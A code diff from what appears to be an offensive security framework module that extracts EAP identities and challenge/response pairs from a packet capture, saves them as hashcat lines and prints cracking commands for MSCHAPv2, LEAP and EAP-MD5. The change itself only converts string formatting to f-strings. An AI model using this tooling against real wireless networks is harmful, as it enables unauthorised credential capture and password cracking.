@@ -64,25 +64,25 @@ class Exploit(Exploit):
 
         hashcat_lines = []
         for entry in identities:
-            print_status("Client: {}".format(entry.client_mac))
-            print_info("  BSSID:    {}".format(entry.bssid))
+            print_status(f"Client: {entry.client_mac}")
+            print_info(f"  BSSID:    {entry.bssid}")
             print_info("  SSID:     {}".format(entry.ssid if entry.ssid else "<unknown>"))
-            print_info("  EAP Type: {}".format(entry.eap_type))
+            print_info(f"  EAP Type: {entry.eap_type}")
 
             if entry.identity:
-                print_success("  Identity: {}".format(entry.identity))
+                print_success(f"  Identity: {entry.identity}")
 
             if entry.challenge:
-                print_info("  Challenge: {}".format(entry.challenge.hex()))
+                print_info(f"  Challenge: {entry.challenge.hex()}")
             if entry.response:
-                print_info("  Response:  {}".format(entry.response.hex()))
+                print_info(f"  Response:  {entry.response.hex()}")
 
             if entry.success is not None:
                 status = "SUCCESS" if entry.success else "FAILURE"
-                print_info("  Auth result: {}".format(status))
+                print_info(f"  Auth result: {status}")
 
             if entry.hashcat_line:
-                print_success("  Hashcat: {}".format(entry.hashcat_line))
+                print_success(f"  Hashcat: {entry.hashcat_line}")
                 hashcat_lines.append(entry.hashcat_line)
 
             print_status("")
@@ -94,24 +94,24 @@ class Exploit(Exploit):
                 base = os.path.splitext(os.path.basename(self.pcap_file))[0]
                 out_file = os.path.join(
                     os.path.dirname(os.path.abspath(self.pcap_file)),
-                    "{}_wpe_hashes.txt".format(base),
+                    f"{base}_wpe_hashes.txt",
                 )
             with open(out_file, "w", encoding="utf-8") as f:
                 for line in hashcat_lines:
                     f.write(line + "\n")
-            print_success("Saved {} hash(es) to: {}".format(len(hashcat_lines), out_file))
+            print_success(f"Saved {len(hashcat_lines)} hash(es) to: {out_file}")
             print_status("")
             print_info("Crack with:")
-            print_info("  MSCHAPv2: hashcat -m 5500 {} <wordlist>".format(out_file))
+            print_info(f"  MSCHAPv2: hashcat -m 5500 {out_file} <wordlist>")
             print_info("  LEAP:     asleap -C <challenge> -R <response> -W <wordlist>")
-            print_info("  EAP-MD5:  hashcat -m 4800 {} <wordlist>".format(out_file))
+            print_info(f"  EAP-MD5:  hashcat -m 4800 {out_file} <wordlist>")
 
         print_status("")
         print_status("--- Summary ---")
-        print_info("  EAP sessions:   {}".format(len(identities)))
-        print_info("  With identity:  {}".format(sum(1 for e in identities if e.identity)))
-        print_info("  With challenge: {}".format(sum(1 for e in identities if e.challenge)))
-        print_info("  Crackable:      {}".format(len(hashcat_lines)))
+        print_info(f"  EAP sessions:   {len(identities)}")
+        print_info(f"  With identity:  {sum(1 for e in identities if e.identity)}")
+        print_info(f"  With challenge: {sum(1 for e in identities if e.challenge)}")
+        print_info(f"  Crackable:      {len(hashcat_lines)}")
 
     @mute
     def check(self):
